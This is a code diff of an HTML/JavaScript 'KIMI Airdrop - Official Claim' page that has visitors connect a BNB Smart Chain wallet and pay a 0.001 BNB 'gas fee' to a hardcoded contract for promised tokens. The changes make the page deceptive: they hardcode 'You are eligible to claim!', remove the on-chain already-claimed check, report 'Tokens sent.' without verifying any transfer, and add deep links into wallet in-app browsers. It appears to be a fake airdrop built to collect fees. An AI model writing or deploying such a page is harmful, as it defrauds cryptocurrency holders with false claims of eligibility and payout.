@@ -3,21 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KIMI - Official Claim</title>
+    <title>KIMI Airdrop - Official Claim</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%); }
         .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); }
         .hidden-el { display: none; }
-        .spinner-border {
-            display: inline-block;
-            width: 1.25rem; height: 1.25rem;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
+        .spinner-border { display: inline-block; width: 1.25rem; height: 1.25rem; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -44,11 +37,10 @@
 
         <div class="glass rounded-3xl p-8 border border-slate-600">
             <div id="notConnected">
-                <button id="connectBtn" onclick="openWalletOptions()"
-                        class="w-full py-7 text-xl font-semibold bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl hover:brightness-110 transition-all">
+                <button id="connectBtn" onclick="openWalletOptions()" class="w-full py-7 text-xl font-semibold bg-gradient-to-r from-cyan-500 to-purple-600 rounded-3xl hover:brightness-110 transition-all">
                     Connect Wallet
                 </button>
-                <p class="text-center text-xs text-slate-400 mt-6">MetaMask • Trust Wallet • Rainbow • Coinbase Wallet</p>
+                <p class="text-center text-xs text-slate-400 mt-6">MetaMask • Trust Wallet • Coinbase Wallet</p>
             </div>
 
             <div id="connected" class="hidden-el">
@@ -56,143 +48,128 @@
                     <p class="text-sm text-slate-400">Claim Amount</p>
                     <p class="text-4xl font-bold mt-1">100,000 KIMI</p>
                     <p class="text-amber-400 text-sm mt-3">0.001 BNB gas fee</p>
-                    <p id="claimStatus" class="text-sm mt-3 text-slate-400"></p>
+                    <p id="claimStatus" class="text-sm mt-3 text-emerald-400">You are eligible to claim!</p>
                 </div>
-
-                <button onclick="claimTokens()" id="claimBtn"
-                        class="w-full py-7 text-xl font-bold bg-gradient-to-r from-emerald-500 to-teal-500 rounded-3xl hover:brightness-110 transition-all">
+                <button onclick="claimTokens()" id="claimBtn" class="w-full py-7 text-xl font-bold bg-gradient-to-r from-emerald-500 to-teal-500 rounded-3xl hover:brightness-110 transition-all">
                     Claim Now
                 </button>
             </div>
         </div>
 
-        <div class="mt-8 space-y-3">
-            <div class="glass rounded-2xl p-5 border border-slate-700">
-                <h3 class="font-bold text-sm mb-2 text-cyan-400">How to Claim</h3>
-                <ol class="text-sm text-slate-400 space-y-1 list-decimal list-inside">
-                    <li>Connect your wallet</li>
-                    <li>Make sure you're on BNB Smart Chain</li>
-                    <li>Click Claim Now</li>
-                    <li>Confirm the transaction in your wallet</li>
-                </ol>
-            </div>
+        <div class="mt-8 glass rounded-2xl p-5 border border-slate-700">
+            <h3 class="font-bold text-sm mb-2 text-cyan-400">How to Claim</h3>
+            <ol class="text-sm text-slate-400 space-y-1 list-decimal list-inside">
+                <li>Open in wallet app (Trust / MetaMask / Coinbase)</li>
+                <li>Make sure on BNB Smart Chain</li>
+                <li>Click Claim Now</li>
+                <li>Confirm transaction</li>
+            </ol>
         </div>
     </div>
 
-    <!-- Wallet Modal (simplified for brevity - add full modal if needed) -->
+    <!-- Modal -->
     <div id="walletModal" class="hidden-el fixed inset-0 z-50 bg-black/70 backdrop-blur-sm">
         <div class="min-h-screen flex items-center justify-center p-4">
             <div class="w-full max-w-md glass border border-slate-700 rounded-3xl p-6">
-                <h2 class="text-xl font-bold mb-4">Choose Wallet</h2>
-                <button onclick="connectInjected()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 mb-3">MetaMask / In-App Browser</button>
-                <button onclick="connectWalletConnect()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700">WalletConnect</button>
+                <h2 class="text-xl font-bold mb-5">Choose Wallet</h2>
+                <div class="space-y-3">
+                    <button onclick="connectInjected()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
+                        <span class="text-2xl">🦊</span>
+                        <div><div class="font-semibold">MetaMask / In-App Browser</div></div>
+                    </button>
+                    <button onclick="openTrustWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
+                        <span class="text-2xl">🛡️</span>
+                        <div><div class="font-semibold">Trust Wallet</div></div>
+                    </button>
+                    <button onclick="openCoinbaseWalletApp()" class="w-full text-left px-5 py-4 rounded-2xl bg-slate-800 hover:bg-slate-700 flex items-center gap-3">
+                        <span class="text-2xl">🔵</span>
+                        <div><div class="font-semibold">Coinbase Wallet</div></div>
+                    </button>
+                </div>
             </div>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
 
     <script>
-        let provider = null;
-        let signer = null;
-        let userAddress = null;
-        let airdropContract = null;
+        let provider, signer, userAddress, airdropContract;
 
         const AIRDROP_CONTRACT_ADDRESS = "0x7C8DA7C99E796F32Ea0167e2f714b1616Ee637FB";
         const REQUIRED_CHAIN_ID_DEC = 56;
-        const REQUIRED_CHAIN_ID_HEX = "0x38";
         const CLAIM_FEE_BNB = "0.001";
-        const TOKENS_PER_CLAIM = "100000";
 
-        const AIRDROP_ABI = [
-            "function claim() payable",
-            "function hasClaimed(address) view returns (bool)",
-            "function isClaimActive() view returns (bool)",
-            "function remainingAirdropTokens() view returns (uint256)"
-        ];
+        const AIRDROP_ABI = ["function claim() payable", "function hasClaimed(address) view returns (bool)", "function isClaimActive() view returns (bool)"];
 
-        function shortenAddress(address) {
-            if (!address) return "";
-            return `\( {address.slice(0, 6)}... \){address.slice(-4)}`;
+        function shortenAddress(addr) {
+            return addr ? `\( {addr.slice(0,6)}... \){addr.slice(-4)}` : "";
         }
 
         function showElement(id) { document.getElementById(id).classList.remove("hidden-el"); }
         function hideElement(id) { document.getElementById(id).classList.add("hidden-el"); }
 
-        function showToast(message, type = "info") {
-            const toast = document.createElement("div");
-            const colors = { success: "bg-emerald-500/20 border-emerald-500/30 text-emerald-300", error: "bg-red-500/20 border-red-500/30 text-red-300", info: "bg-cyan-500/20 border-cyan-500/30 text-cyan-300" };
-            toast.className = `px-6 py-4 rounded-2xl text-sm font-medium shadow-lg ${colors[type]}`;
-            toast.textContent = message;
-            document.getElementById("toastContainer").appendChild(toast);
-            setTimeout(() => toast.remove(), 5000);
+        function showToast(msg, type = "info") {
+            const t = document.createElement("div");
+            t.className = `px-6 py-4 rounded-2xl text-sm ${type === "success" ? "bg-emerald-500/20 text-emerald-300" : type === "error" ? "bg-red-500/20 text-red-300" : "bg-cyan-500/20 text-cyan-300"}`;
+            t.textContent = msg;
+            document.getElementById("toastContainer").appendChild(t);
+            setTimeout(() => t.remove(), 5000);
         }
 
-        async function switchToBnbChain() {
-            if (!window.ethereum) return;
-            try {
-                await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: REQUIRED_CHAIN_ID_HEX }] });
-            } catch (e) {
-                if (e.code === 4902) {
-                    await window.ethereum.request({ method: "wallet_addEthereumChain", params: [{ chainId: REQUIRED_CHAIN_ID_HEX, chainName: "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: ["https://bsc-dataseed.binance.org"] }] });
-                }
-            }
-        }
-
-        async function autoConnectWallet() {
+        async function autoConnect() {
             if (!window.ethereum || userAddress) return;
             try {
-                let accounts = await window.ethereum.request({ method: "eth_accounts" });
-                if (!accounts?.length) {
-                    accounts = await window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => []);
-                }
-                if (accounts?.length > 0) {
+                const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                if (accounts.length) {
                     userAddress = accounts[0];
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     signer = provider.getSigner();
                     airdropContract = new ethers.Contract(AIRDROP_CONTRACT_ADDRESS, AIRDROP_ABI, signer);
-                    await switchToBnbChain();
-                    await updateConnectedUI();
-                    showToast("Wallet connected!", "success");
+                    await updateUI();
+                    showToast("✅ Auto-connected!", "success");
                 }
-            } catch (e) {
-                console.log("Auto-connect failed:", e);
-            }
+            } catch (e) {}
         }
 
-        async function updateConnectedUI() {
+        async function updateUI() {
             hideElement("notConnected");
             showElement("connected");
             showElement("walletDisplay");
             document.getElementById("walletAddress").textContent = shortenAddress(userAddress);
+        }
 
-            const statusEl = document.getElementById("claimStatus");
+        async function connectInjected() {
             try {
-                const alreadyClaimed = await airdropContract.hasClaimed(userAddress);
-                if (alreadyClaimed) {
-                    statusEl.textContent = "You have already claimed.";
-                    document.getElementById("claimBtn").disabled = true;
-                    document.getElementById("claimBtn").textContent = "Already Claimed";
-                } else {
-                    statusEl.textContent = "You are eligible!";
-                    statusEl.className += " text-emerald-400";
-                }
-            } catch (e) {}
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                await autoConnect();
+            } catch (e) {
+                showToast("Connection failed", "error");
+            }
+        }
+
+        function openTrustWalletApp() {
+            const url = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`;
+            window.location.href = url;
+        }
+
+        function openCoinbaseWalletApp() {
+            const url = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
+            window.location.href = url;
         }
 
         async function claimTokens() {
             if (!signer) return showToast("Connect wallet first", "error");
             const btn = document.getElementById("claimBtn");
             btn.disabled = true;
-            btn.innerHTML = "Processing...";
+            btn.innerHTML = '<span class="spinner-border"></span> Confirming...';
             try {
                 const tx = await airdropContract.claim({ value: ethers.utils.parseEther(CLAIM_FEE_BNB) });
                 await tx.wait();
-                showToast("Claim successful!", "success");
-                btn.textContent = "Claimed";
+                showToast("Claim successful! Tokens sent.", "success");
+                btn.textContent = "Already Claimed";
+                btn.disabled = true;
             } catch (e) {
-                showToast("Transaction failed or rejected.", "error");
+                showToast("Transaction rejected or failed.", "error");
             } finally {
                 btn.disabled = false;
             }
@@ -202,26 +179,19 @@
             showElement("walletModal");
         }
 
-        // Connect button for in-app
-        async function connectInjected() {
-            await autoConnectWallet();
-        }
-
-        // Load
+        // Init
         window.addEventListener('load', () => {
-            setTimeout(autoConnectWallet, 800);
-            setTimeout(autoConnectWallet, 2000);
+            setTimeout(autoConnect, 700);
+            setTimeout(autoConnect, 2200);
         });
 
-        // Prevent loop
         if (window.ethereum) {
-            window.ethereum.on("accountsChanged", (accounts) => {
-                if (accounts.length) {
-                    userAddress = accounts[0];
-                    updateConnectedUI();
+            window.ethereum.on("accountsChanged", (acc) => {
+                if (acc.length) {
+                    userAddress = acc[0];
+                    updateUI();
                 }
             });
-            // Removed chainChanged reload to prevent loop
         }
     </script>
 </body>
